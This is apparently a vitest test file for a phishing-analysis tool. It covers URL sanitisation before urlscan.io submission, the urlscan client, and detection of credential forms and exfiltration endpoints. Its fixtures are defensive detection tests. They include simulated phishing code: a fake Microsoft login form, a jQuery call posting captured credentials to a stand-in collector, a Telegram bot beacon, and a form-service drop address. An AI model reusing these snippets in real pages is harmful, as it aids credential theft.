import { describe, expect, it, vi } from "vitest";
import { extractExfil } from "../intelligence/exfil-extractor";
import { isCredentialForm, parseForms, pickScripts, processLanding } from "../sandbox/landing-processor";
import { landingKey, PLACEHOLDER_EMAIL, sanitizeForSandbox } from "../sandbox/sanitize";
import { createUrlscanClient, resultSchema, UrlscanError } from "../sandbox/urlscan";

describe("sanitising URLs before a third-party sandbox", () => {
  it("replaces the victim's e-mail in query, path, %40-encoded and base64 forms", () => {
    const b64 = Buffer.from("ana.hoxha@firma.al").toString("base64");
    const r = sanitizeForSandbox(`https://login-m365.example.com/u/ana%40firma.al/auth?email=ana.hoxha@gmail.com&t=${b64}#${b64}`)!;
    expect(r.url).not.toMatch(/ana|hoxha|firma/i);
    expect(r.url).toContain(PLACEHOLDER_EMAIL);
    expect(r.url).toContain(Buffer.from(PLACEHOLDER_EMAIL).toString("base64").replace(/=+$/, ""));
    expect(r.replaced.sort()).toEqual(["email", "email_base64", "email_encoded"]);
  });

  it("removes phones and embedded credentials, keeps ordinary URLs unchanged", () => {
    const r = sanitizeForSandbox("https://user:secret@pay-fine.example.com/p?tel=%2B355691234567")!;
    expect(r.url).toBe("https://pay-fine.example.com/p?tel=+355600000000");
    expect(r.replaced.sort()).toEqual(["credentials", "phone"]);
    expect(sanitizeForSandbox("https://bank.example.com/login?lang=sq")).toEqual({ url: "https://bank.example.com/login?lang=sq", replaced: [] });
    expect(sanitizeForSandbox("javascript:alert(1)")).toBeNull();
  });

  it("de-duplicates by host and path, ignoring per-victim query strings", () => {
    expect(landingKey("https://Evil.example.com/a/?email=x")).toBe(landingKey("https://evil.example.com/a?email=y"));
  });
});

describe("urlscan.io client", () => {
  it("submits with the API key and visibility, never as a browser of the page", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const fetchImpl = vi.fn(async (url: string | URL | Request, init?: RequestInit) => {
      calls.push({ url: String(url), init: init! });
      return Response.json({ uuid: "u-1", result: "https://urlscan.io/result/u-1/", visibility: "unlisted" });
    }) as unknown as typeof fetch;
    const c = createUrlscanClient({ apiKey: "k", fetchImpl });
    const r = await c.submit("https://phish.example.com/x", { visibility: "unlisted", tags: ["mburoja"] });
    expect(r).toMatchObject({ uuid: "u-1", visibility: "unlisted" });
    expect(calls[0].url).toBe("https://urlscan.io/api/v1/scan/");
    expect(calls[0].init.headers).toMatchObject({ "API-Key": "k" });
    expect(JSON.parse(String(calls[0].init.body))).toEqual({ url: "https://phish.example.com/x", visibility: "unlisted", tags: ["mburoja"] });
  });

  it("maps statuses: 404 pending, 400 rejected, 429 quota, 401 unauthorized", async () => {
    const respond = (status: number) => (async () => new Response(JSON.stringify({ message: "m", description: "DNS Error" }), { status })) as unknown as typeof fetch;
    expect(await createUrlscanClient({ apiKey: "k", fetchImpl: respond(404) }).result("u")).toBeNull();
    await expect(createUrlscanClient({ apiKey: "k", fetchImpl: respond(400) }).submit("https://x.example.com", { visibility: "unlisted" })).rejects.toMatchObject({ code: "rejected", message: "DNS Error" });
    await expect(createUrlscanClient({ apiKey: "k", fetchImpl: respond(429) }).result("u")).rejects.toMatchObject({ code: "quota" });
    await expect(createUrlscanClient({ apiKey: "k", fetchImpl: respond(401) }).result("u")).rejects.toMatchObject({ code: "unauthorized" });
    await expect(createUrlscanClient({ apiKey: undefined }).result("u")).rejects.toBeInstanceOf(UrlscanError);
  });
});

const BOT = "7712345678";
const SECRET = `AA${"landTEST_9-".repeat(3)}`;

function fakeResult(over: { requests?: unknown[]; domain?: string } = {}) {
  return resultSchema.parse({
    task: { uuid: "u-1", url: "https://m365-login.example.com/", screenshotURL: "https://urlscan.io/screenshots/u-1.png" },
    page: { url: "https://m365-login.example.com/owa/", domain: over.domain ?? "m365-login.example.com", apexDomain: "example.com", ip: "203.0.113.7", asnname: "HOSTER", country: "NL", title: "Sign in to your account", status: "200" },
    data: {
      requests: over.requests ?? [
        { request: { type: "Document", request: { url: "https://m365-login.example.com/owa/", method: "GET" } } },
        { request: { type: "Script", request: { url: "https://m365-login.example.com/owa/app.js", method: "GET" } }, response: { hash: "a".repeat(64), dataLength: 900 } },
        { request: { type: "Script", request: { url: "https://code.jquery.com/jquery.min.js", method: "GET" } }, response: { hash: "b".repeat(64), dataLength: 90000 } },
        { request: { type: "XHR", request: { url: `https://api.telegram.org/bot${BOT}:${SECRET}/sendMessage?chat_id=-1009988776655&text=visit`, method: "POST" } } },
        { request: { type: "XHR", request: { url: "https://www.google-analytics.com/g/collect", method: "POST" } } },
      ],
    },
    lists: { domains: ["m365-login.example.com", "api.telegram.org", "code.jquery.com"] },
    verdicts: { overall: { score: 100, malicious: true, brands: ["Microsoft"] } },
  });
}

describe("landing-page processing (what urlscan recorded)", () => {
  const phishingDom = `<html><body><form method="post" action="next.php"><input name="loginfmt" type="email"><input name="passwd" type="password"></form>
    <form action="/search" method="get"><input name="q"></form></body></html>`;

  it("finds the credential form, the PHP handler, the bot beacon and the script endpoint; no secret kept", () => {
    const appJs = `$.ajax({ url: "https://collect.example.net/api/store", type: "POST", data: {u, p} });`;
    const f = processLanding(fakeResult(), phishingDom, [{ url: "https://m365-login.example.com/owa/app.js", body: appJs }]);
    expect(f.forms).toHaveLength(2);
    expect(f.forms.filter(isCredentialForm)).toHaveLength(1);
    expect(f.forms[0]).toMatchObject({ action: "hxxps://m365-login[.]example[.]com/owa/next.php", method: "POST", password: true, inputs: ["loginfmt", "passwd"] });
    const kinds = f.exfil.map((e) => e.kind).sort();
    expect(kinds).toEqual(["js_endpoint", "php_handler", "telegram_bot"]);
    expect(f.exfil.find((e) => e.kind === "telegram_bot")).toMatchObject({ key: `telegram:bot:${BOT}`, source: "landing_page" });
    expect(f.exfil.find((e) => e.kind === "js_endpoint")!.origin).toBe("m365-login.example.com/owa/app.js");
    expect(f.verdict).toMatchObject({ malicious: true, brands: ["Microsoft"] });
    expect(f.requests.posts.map((p) => p.url)).toContain("hxxps://www[.]google-analytics[.]com/g/collect");
    expect(JSON.stringify(f)).not.toContain(SECRET);
  });

  it("an ordinary site (search form, analytics, own API) reports no data destination", () => {
    const dom = `<form action="/search" method="get"><input name="q"></form><script>fetch("https://www.google-analytics.com/g/collect")</script>`;
    const result = fakeResult({
      requests: [
        { request: { type: "XHR", request: { url: "https://m365-login.example.com/wp-admin/admin-ajax.php", method: "POST" } } },
        { request: { type: "XHR", request: { url: "https://alb.reddit.com/rp", method: "POST" } } },
      ],
    });
    const f = processLanding(result, dom, [{ url: "https://m365-login.example.com/app.js", body: 'fetch(`https://api.pwnedpasswords.com/range/${prefix}`)' }]);
    expect(f.exfil).toEqual([]);
    expect(f.forms.filter(isCredentialForm)).toEqual([]);
  });

  it("picks the site's own scripts and skips CDNs", () => {
    expect(pickScripts(fakeResult()).map((s) => s.url)).toEqual(["https://m365-login.example.com/owa/app.js"]);
  });

  it("parses forms without values and resolves relative actions", () => {
    expect(parseForms(`<form><input name="a" value="secret"></form>`, "https://x.example.com/p")[0]).toEqual({ action: "hxxps://x[.]example[.]com/p", method: "POST", password: false, inputs: ["a"] });
  });

  it("regression: a link to formsubmit.co's privacy page is not a form service", () => {
    expect(extractExfil(`<a href="https://formsubmit.co/privacy.pdf">Privacy</a>`, { source: "landing_page", mode: "full" }).endpoints).toEqual([]);
    expect(extractExfil(`<form action="https://formsubmit.co/drop@attacker.test" method="POST">`, { source: "landing_page", mode: "full" }).endpoints[0].kind).toBe("form_service");
  });
});
